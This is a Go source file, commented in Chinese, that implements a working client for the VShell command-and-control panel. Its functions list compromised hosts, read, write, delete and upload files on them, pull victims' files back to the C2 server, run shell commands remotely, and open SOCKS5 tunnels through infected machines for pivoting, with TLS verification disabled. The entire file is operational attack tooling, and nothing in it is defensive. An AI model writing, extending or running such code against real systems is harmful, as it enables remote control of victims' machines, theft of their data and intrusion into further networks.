package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Response 对应 VShell 的统一响应格式：
//
//	{"code":0,"message":"ok","result":...,"type":"success"}
type Response struct {
	Code    *int            `json:"code"`
	Message string          `json:"message"`
	Result  json.RawMessage `json:"result"`
	Type    string          `json:"type"`
	Success bool            `json:"success"`
	Sent    bool            `json:"sent"`
	URL     string          `json:"url"`
}

func (r *Response) OK() bool {
	if r.Code != nil {
		return *r.Code == 0
	}
	return r.Success || r.Sent
}

func (r *Response) ErrText() string {
	if r.Message != "" {
		return r.Message
	}
	if r.Code != nil {
		return fmt.Sprintf("code=%d", *r.Code)
	}
	return "未知错误"
}

func (r *Response) Decode(v any) error {
	if len(r.Result) == 0 || string(r.Result) == "null" {
		return nil
	}
	return json.Unmarshal(r.Result, v)
}

// ShellError 表示命令执行失败。部分场景下 VShell 仍会带回已产生的输出。
type ShellError struct {
	Message string
	Output  string
}

func (e *ShellError) Error() string {
	if strings.Contains(e.Message, "exit status 127") {
		return "命令不存在（" + e.Message + "）"
	}
	return e.Message
}

// ---------------- 数据模型 ----------------

type Dashboard struct {
	Version             string `json:"version"`
	ClientCount         int    `json:"clientCount"`
	ClientOnlineCount   int    `json:"clientOnlineCount"`
	ListenerCount       int    `json:"listenerCount"`
	ListenerOnlineCount int    `json:"listenerOnlineCount"`
	Socks5Count         int    `json:"socks5Count"`
	LicTime             string `json:"licTime"`
}

type Agent struct {
	ID        any    `json:"Id"`
	HostName  string `json:"HostName"`
	LocalIP   string `json:"LocalIP"`
	Addr      string `json:"Addr"`
	OsName    string `json:"OsName"`
	IsConnect bool   `json:"IsConnect"`
}

type AgentList struct {
	Items             []Agent `json:"items"`
	Total             int     `json:"total"`
	ClientOnlineCount int     `json:"clientOnlineCount"`
}

type Disk struct {
	Name  string `json:"name"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
}

type FileEntry struct {
	Name  string `json:"name"`
	Size  int64  `json:"size"`
	Time  string `json:"time"`
	IsDir bool   `json:"isDir"`
}

type FileList struct {
	Items []FileEntry `json:"items"`
	Total int         `json:"total"`
}

type Tunnel struct {
	ID        any    `json:"Id"`
	ClientID  any    `json:"ClientId"`
	Port      int    `json:"Port"`
	Mode      string `json:"Mode"`
	RunStatus bool   `json:"RunStatus"`
	Remark    string `json:"Remark"`
}

type TunnelList struct {
	Items []Tunnel `json:"items"`
	Total int      `json:"total"`
}

type Listener struct {
	ID          any    `json:"Id"`
	Mode        string `json:"Mode"`
	ListenAddr  string `json:"ListenAddr"`
	ConnectAddr string `json:"ConnectAddr"`
	Status      bool   `json:"Status"`
	Remark      string `json:"Remark"`
}

type ListenerList struct {
	Items []Listener `json:"items"`
	Total int        `json:"total"`
}

type Runner struct {
	ID   any    `json:"id"`
	Name string `json:"name"`
}

// ---------------- 客户端 ----------------

type Client struct {
	BaseURL     string
	User        string
	Pass        string
	Token       string
	Basic       string
	Insecure    bool
	HTTPTimeout time.Duration
	http        *http.Client
}

func NewClient(cfg *Config) *Client {
	tr := &http.Transport{
		Proxy:           http.ProxyFromEnvironment,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: cfg.Insecure},
	}
	return &Client{
		BaseURL:     strings.TrimRight(cfg.URL, "/"),
		User:        cfg.User,
		Pass:        cfg.Pass,
		Insecure:    cfg.Insecure,
		HTTPTimeout: cfg.HTTPTimeout,
		http:        &http.Client{Transport: tr},
	}
}

// Login 用账号密码换取 JWT，并生成双认证头所需的 Basic 值。
func (c *Client) Login() error {
	if c.User == "" {
		return errors.New("缺少用户名（--user、VSHELL_USER 或 config.ini 的 [vshell] username）")
	}
	body := map[string]string{"username": c.User, "password": c.Pass}
	var resp Response
	if err := c.doJSON(http.MethodPost, "/api/login", body, &resp, false, 0); err != nil {
		return fmt.Errorf("登录请求失败: %w", err)
	}
	if !resp.OK() {
		return fmt.Errorf("登录失败: %s", resp.ErrText())
	}
	tok, err := extractToken(resp.Result)
	if err != nil {
		return err
	}
	c.Token = tok
	c.Basic = "Basic " + base64.StdEncoding.EncodeToString([]byte(c.User+":"+c.Pass))
	return nil
}

// EnsureLogin 首次需要认证时登录，避免用法错误也要先联网。
func (c *Client) EnsureLogin() error {
	if c.Token != "" {
		return nil
	}
	return c.Login()
}

func extractToken(raw json.RawMessage) (string, error) {
	if len(raw) == 0 {
		return "", errors.New("登录响应缺少 result")
	}
	var obj struct {
		Token string `json:"token"`
	}
	if err := json.Unmarshal(raw, &obj); err == nil && obj.Token != "" {
		return obj.Token, nil
	}
	var alt struct {
		AccessToken string `json:"accessToken"`
	}
	if err := json.Unmarshal(raw, &alt); err == nil && alt.AccessToken != "" {
		return alt.AccessToken, nil
	}
	var s string
	if err := json.Unmarshal(raw, &s); err == nil && s != "" {
		return s, nil
	}
	return "", fmt.Errorf("无法从登录响应中解析 token: %s", truncate(string(raw), 200))
}

func (c *Client) authHeaders(req *http.Request) {
	if c.Basic != "" {
		req.Header.Set("Authorization", c.Basic)
	}
	if c.Token != "" {
		req.Header.Set("Token", c.Token)
	}
}

func (c *Client) doJSON(method, path string, payload any, out *Response, auth bool, timeout time.Duration) error {
	if timeout <= 0 {
		timeout = c.HTTPTimeout
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var body io.Reader
	if payload != nil {
		b, err := json.Marshal(payload)
		if err != nil {
			return err
		}
		body = bytes.NewReader(b)
	}
	req, err := http.NewRequestWithContext(ctx, method, c.BaseURL+path, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	if auth {
		c.authHeaders(req)
	}

	resp, err := c.http.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return err
	}
	if resp.StatusCode >= 400 {
		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, truncate(string(data), 500))
	}
	if err := json.Unmarshal(data, out); err != nil {
		return fmt.Errorf("响应不是 JSON: %s", truncate(string(data), 300))
	}
	return nil
}

// Post 发送带认证的 POST 请求。
func (c *Client) Post(path string, payload any, timeout time.Duration) (*Response, error) {
	var resp Response
	if err := c.doJSON(http.MethodPost, path, payload, &resp, true, timeout); err != nil {
		return nil, err
	}
	return &resp, nil
}

// Get 发送带认证的 GET 请求。
func (c *Client) Get(path string, timeout time.Duration) (*Response, error) {
	var resp Response
	if err := c.doJSON(http.MethodGet, path, nil, &resp, true, timeout); err != nil {
		return nil, err
	}
	return &resp, nil
}

// Upload 以 multipart/form-data 上传本地文件到 Agent。
func (c *Client) Upload(clientID int, localPath, remotePath string, timeout time.Duration) (*Response, error) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return nil, fmt.Errorf("读取本地文件失败: %w", err)
	}
	if remotePath == "" {
		remotePath = filepath.Base(localPath)
	}
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	if err := mw.WriteField("id", strconv.Itoa(clientID)); err != nil {
		return nil, err
	}
	if err := mw.WriteField("path", remotePath); err != nil {
		return nil, err
	}
	fw, err := mw.CreateFormFile("file", filepath.Base(localPath))
	if err != nil {
		return nil, err
	}
	if _, err := fw.Write(data); err != nil {
		return nil, err
	}
	if err := mw.Close(); err != nil {
		return nil, err
	}

	if timeout <= 0 {
		timeout = 120 * time.Second
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.BaseURL+"/api/file/upload", &buf)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("ignoreCancelToken", "true")
	c.authHeaders(req)

	resp, err := c.http.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, truncate(string(raw), 500))
	}
	var out Response
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, fmt.Errorf("响应不是 JSON: %s", truncate(string(raw), 300))
	}
	return &out, nil
}

// ---------------- 端点封装 ----------------

func (c *Client) Dashboard() (*Dashboard, error) {
	resp, err := c.Get("/api/dashboard/info", 10*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var d Dashboard
	if err := resp.Decode(&d); err != nil {
		return nil, err
	}
	return &d, nil
}

// Agents status: true=在线, false=离线, ""=全部
func (c *Client) Agents(status any) (*AgentList, error) {
	payload := map[string]any{"page": 1, "pageSize": 9999, "status": status}
	resp, err := c.Post("/api/client/list", payload, 30*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var list AgentList
	if err := resp.Decode(&list); err != nil {
		return nil, err
	}
	return &list, nil
}

func (c *Client) Disks(clientID int) ([]Disk, error) {
	resp, err := c.Post("/api/file/getdisk", map[string]any{"id": clientID}, 15*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var disks []Disk
	if err := resp.Decode(&disks); err != nil {
		return nil, err
	}
	return disks, nil
}

func (c *Client) ListDir(clientID int, path string, page, pageSize int, field, order string) (*FileList, error) {
	payload := map[string]any{
		"page": page, "pageSize": pageSize,
		"id": clientID, "path": path,
		"field": field, "order": order,
	}
	resp, err := c.Post("/api/file/ls", payload, 20*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var list FileList
	if err := resp.Decode(&list); err != nil {
		return nil, err
	}
	return &list, nil
}

// ReadFile 读取 Agent 文件并返回解码后的内容。
// 注意 VShell 的 /api/file/cat 要求 path=目录、target=文件名。
func (c *Client) ReadFile(clientID int, remotePath string) ([]byte, error) {
	dir, name, err := splitRemotePath(remotePath)
	if err != nil {
		return nil, err
	}
	payload := map[string]any{"id": strconv.Itoa(clientID), "path": dir, "target": name}
	resp, err := c.Post("/api/file/cat", payload, 30*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var body struct {
		Content string `json:"content"`
	}
	if err := resp.Decode(&body); err != nil {
		return nil, err
	}
	if body.Content == "" {
		return []byte{}, nil
	}
	return base64.StdEncoding.DecodeString(body.Content)
}

func (c *Client) WriteFile(clientID int, remotePath, content string) error {
	payload := map[string]any{
		"id": strconv.Itoa(clientID), "path": remotePath, "content": content,
	}
	resp, err := c.Post("/api/file/edit", payload, 30*time.Second)
	if err != nil {
		return err
	}
	if !resp.OK() {
		return errors.New(resp.ErrText())
	}
	return nil
}

func (c *Client) RemoveFile(clientID int, remotePath string) error {
	payload := map[string]any{"id": strconv.Itoa(clientID), "path": remotePath}
	resp, err := c.Post("/api/file/rm", payload, 15*time.Second)
	if err != nil {
		return err
	}
	if !resp.OK() {
		return errors.New(resp.ErrText())
	}
	return nil
}

// DownloadFromAgent 触发 C2 从 Agent 拉取文件并轮询进度。
func (c *Client) DownloadFromAgent(clientID int, remotePath string, wait time.Duration, progress func(pct int)) (int64, error) {
	dir, name, err := splitRemotePath(remotePath)
	if err != nil {
		return 0, err
	}

	// 先查文件大小，供 getdownloadper 使用
	var size int64
	if list, err := c.ListDir(clientID, dir, 1, 200, "name", "ascend"); err == nil {
		for _, it := range list.Items {
			if it.Name == name {
				size = it.Size
				break
			}
		}
	}

	trigger := map[string]any{"id": strconv.Itoa(clientID), "path": dir, "target": name}
	resp, err := c.Post("/api/file/downloadtoserver", trigger, 20*time.Second)
	if err != nil {
		return 0, err
	}
	if !resp.OK() {
		return 0, fmt.Errorf("触发下载失败: %s", resp.ErrText())
	}

	deadline := time.Now().Add(wait)
	last := -1
	for time.Now().Before(deadline) {
		time.Sleep(time.Second)
		poll := map[string]any{
			"id": strconv.Itoa(clientID), "path": dir, "target": name, "size": size,
		}
		p, err := c.Post("/api/file/getdownloadper", poll, 15*time.Second)
		if err != nil {
			return 0, err
		}
		if !p.OK() {
			return 0, fmt.Errorf("查询进度失败: %s", p.ErrText())
		}
		var body struct {
			Pre int `json:"pre"`
		}
		if err := p.Decode(&body); err != nil {
			return 0, err
		}
		if body.Pre != last && progress != nil {
			progress(body.Pre)
			last = body.Pre
		}
		if body.Pre >= 100 {
			return size, nil
		}
	}
	return 0, fmt.Errorf("下载超时（%s），最后进度 %d%%", wait, last)
}

// ExecShell 同步执行命令，返回终端缓冲区内容。
func (c *Client) ExecShell(clientID int, command string, timeout time.Duration) (string, error) {
	payload := map[string]any{"id": strconv.Itoa(clientID), "command": command}
	resp, err := c.Post("/api/terminal/shell", payload, timeout+5*time.Second)
	if err != nil {
		return "", err
	}
	var out string
	if err := resp.Decode(&out); err != nil {
		return "", err
	}
	if !resp.OK() {
		return out, &ShellError{Message: resp.ErrText(), Output: out}
	}
	return out, nil
}

// ExecAsync 异步下发命令，不等待执行结果。
func (c *Client) ExecAsync(clientID int, command string) error {
	payload := map[string]any{"clientId": clientID, "command": command}
	resp, err := c.Post("/api/terminal/exec", payload, 20*time.Second)
	if err != nil {
		return err
	}
	if !resp.OK() {
		return errors.New(resp.ErrText())
	}
	return nil
}

func (c *Client) Tunnels(clientID int) (*TunnelList, error) {
	payload := map[string]any{"page": 1, "pageSize": 200, "ClientId": clientID}
	resp, err := c.Post("/api/tunnel/list", payload, 20*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var list TunnelList
	if err := resp.Decode(&list); err != nil {
		return nil, err
	}
	return &list, nil
}

// StartTunnel 创建并启动 SOCKS5 隧道，返回隧道 ID。
func (c *Client) StartTunnel(clientID, port int) (any, error) {
	add := map[string]any{"ClientId": clientID, "Mode": "socks5", "Port": port}
	resp, err := c.Post("/api/tunnel/add", add, 20*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, fmt.Errorf("创建隧道失败: %s", resp.ErrText())
	}

	// tunnel/add 不回传 id，需要从 tunnel/list 反查
	time.Sleep(500 * time.Millisecond)
	list, err := c.Tunnels(clientID)
	if err != nil {
		return nil, fmt.Errorf("隧道已创建，但反查 ID 失败: %w", err)
	}
	var id any
	for _, t := range list.Items {
		if t.Port == port && fmt.Sprint(t.ClientID) == strconv.Itoa(clientID) {
			id = t.ID
			break
		}
	}
	if id == nil {
		return nil, errors.New("隧道已创建，但 list 中找不到对应端口")
	}

	sr, err := c.Post("/api/tunnel/start", map[string]any{"id": id}, 20*time.Second)
	if err != nil {
		return nil, err
	}
	if !sr.OK() {
		return nil, fmt.Errorf("启动隧道失败: %s", sr.ErrText())
	}
	return id, nil
}

// StopTunnelByPort 按端口查找并停止/删除隧道。
func (c *Client) StopTunnelByPort(port int) (any, error) {
	list, err := c.Tunnels(0)
	if err != nil {
		return nil, err
	}
	var id any
	for _, t := range list.Items {
		if t.Port == port {
			id = t.ID
			break
		}
	}
	if id == nil {
		return nil, fmt.Errorf("端口 %d 没有对应隧道", port)
	}
	if resp, err := c.Post("/api/tunnel/stop", map[string]any{"id": id}, 20*time.Second); err != nil {
		return id, err
	} else if !resp.OK() {
		return id, fmt.Errorf("停止隧道失败: %s", resp.ErrText())
	}
	if resp, err := c.Post("/api/tunnel/del", map[string]any{"id": id}, 20*time.Second); err != nil {
		return id, err
	} else if !resp.OK() {
		return id, fmt.Errorf("删除隧道失败: %s", resp.ErrText())
	}
	return id, nil
}

func (c *Client) Listeners() ([]Listener, error) {
	payload := map[string]any{"page": 1, "pageSize": 200, "ListenerId": 0}
	resp, err := c.Post("/api/listener/list", payload, 20*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var list ListenerList
	if err := resp.Decode(&list); err != nil {
		return nil, err
	}
	return list.Items, nil
}

func (c *Client) Runners() ([]Runner, error) {
	resp, err := c.Get("/api/runner/list", 20*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	var list []Runner
	if err := resp.Decode(&list); err == nil && list != nil {
		return list, nil
	}
	var wrapped struct {
		Items []Runner `json:"items"`
	}
	if err := resp.Decode(&wrapped); err != nil {
		return nil, err
	}
	return wrapped.Items, nil
}

// ---------------- 通用 HTTP 发包 ----------------

type HTTPResult struct {
	Engine  string            `json:"engine"`
	OK      bool              `json:"ok"`
	Status  int               `json:"status,omitempty"`
	Elapsed float64           `json:"elapsed_seconds"`
	Size    int               `json:"size,omitempty"`
	Headers map[string]string `json:"headers,omitempty"`
	Body    string            `json:"body,omitempty"`
	Error   string            `json:"error,omitempty"`
}

func BuildRequest(method, rawURL string, headers []string, body string) (*http.Request, error) {
	var rdr io.Reader
	if body != "" {
		rdr = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, rawURL, rdr)
	if err != nil {
		return nil, err
	}
	for _, h := range headers {
		k, v, ok := strings.Cut(h, ":")
		if !ok {
			return nil, fmt.Errorf("请求头格式应为 'Key: Value': %s", h)
		}
		req.Header.Set(strings.TrimSpace(k), strings.TrimSpace(v))
	}
	return req, nil
}

func (c *Client) plainHTTPClient(timeout time.Duration) *http.Client {
	tr := &http.Transport{
		Proxy:           http.ProxyFromEnvironment,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: c.Insecure},
	}
	return &http.Client{Transport: tr, Timeout: timeout}
}

func (c *Client) ExecuteHTTP(engine, method, rawURL string, headers []string, body string, timeout time.Duration) HTTPResult {
	start := time.Now()
	switch engine {
	case "direct":
		hc := c.plainHTTPClient(timeout)
		req, err := BuildRequest(method, rawURL, headers, body)
		if err != nil {
			return HTTPResult{Engine: engine, Error: err.Error()}
		}
		resp, err := hc.Do(req)
		if err != nil {
			return HTTPResult{Engine: engine, Error: err.Error()}
		}
		defer resp.Body.Close()
		data, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
		if err != nil {
			return HTTPResult{Engine: engine, Error: err.Error()}
		}
		hdrs := make(map[string]string, len(resp.Header))
		for k, v := range resp.Header {
			hdrs[k] = strings.Join(v, ", ")
		}
		return HTTPResult{
			Engine: engine, OK: true, Status: resp.StatusCode,
			Elapsed: time.Since(start).Seconds(), Size: len(data),
			Headers: hdrs, Body: string(data),
		}
	case "curl":
		raw, status, _, err := runCurl(method, rawURL, headers, body, timeout)
		if err != nil {
			return HTTPResult{Engine: engine, Error: err.Error()}
		}
		hdrs, respBody := splitCurlResponse(raw)
		return HTTPResult{
			Engine: engine, OK: true, Status: status,
			Elapsed: time.Since(start).Seconds(), Size: len(respBody),
			Headers: hdrs, Body: respBody,
		}
	default:
		return HTTPResult{Engine: engine, Error: "未知引擎: " + engine + "（可选 direct/curl）"}
	}
}

// ---------------- 工具 ----------------

func splitRemotePath(p string) (dir, name string, err error) {
	q := strings.TrimRight(strings.ReplaceAll(p, "\\", "/"), "/")
	if q == "" {
		return "", "", errors.New("路径为空")
	}
	i := strings.LastIndex(q, "/")
	if i < 0 {
		return "", "", fmt.Errorf("需要完整文件路径（含文件名）: %s", p)
	}
	dir, name = q[:i], q[i+1:]
	if dir == "" {
		dir = "/"
	}
	// posixpath.split("C:/a") 会得到 "C:"，VShell 需要 "C:/"
	if len(dir) == 2 && dir[1] == ':' {
		dir += "/"
	}
	if name == "" {
		return "", "", fmt.Errorf("需要完整文件路径（含文件名）: %s", p)
	}
	return dir, name, nil
}

func freePort() (int, error) {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port, nil
}
